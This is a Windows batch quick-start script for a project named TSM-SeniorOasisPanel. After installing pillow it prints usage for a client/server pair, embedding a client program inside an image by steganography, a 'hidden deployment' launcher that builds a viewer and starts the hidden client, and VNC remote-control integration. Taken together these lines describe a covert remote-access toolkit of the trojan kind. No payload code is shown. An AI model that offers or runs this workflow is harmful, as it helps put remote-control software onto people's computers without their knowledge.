@echo off
echo ================================================
echo TSM-SeniorOasisPanel Quick Start
echo ================================================
echo.

REM Check if Python is installed
python --version >nul 2>&1
if errorlevel 1 (
    echo ERROR: Python is not installed or not in PATH
    echo Please install Python 3.7+ and try again
    pause
    exit /b 1
)

echo Python found. Installing dependencies...
pip install pillow

echo.
echo Creating server directory...
if not exist "server_files" mkdir server_files

echo.
echo ================================================
echo TSM-SeniorOasisPanel Setup Complete
echo ================================================
echo.
echo Available commands:
echo   1. Start Server: python TSM_SeniorOasisPanel_server.py
echo   2. Start Client: python TSM_SeniorOasisPanel_client.py
echo   3. Run Tests: python TSM_SystemTest.py
echo   4. View Guide: type TSM_DeploymentGuide.md
echo.
echo For steganography operations:
echo   - Embed client in image: python TSM_ImageSteganography.py embed ^<image^> ^<client^> ^<output^>
echo   - Extract from image: python TSM_ImageSteganography.py extract ^<stego_image^> ^<output^>
echo   - Verify image: python TSM_ImageSteganography.py verify ^<stego_image^>
echo.
echo For hidden deployment:
echo   - Create viewer: python TSM_HiddenLauncher.py --create-viewer ^<stego_image^> ^<output^>
echo   - Launch hidden: python TSM_HiddenLauncher.py --launch ^<stego_image^>
echo.
echo For VNC integration:
echo   - Start VNC server: python TSM_VNCIntegration.py server
echo   - Start VNC client: python TSM_VNCIntegration.py client
echo.
pause
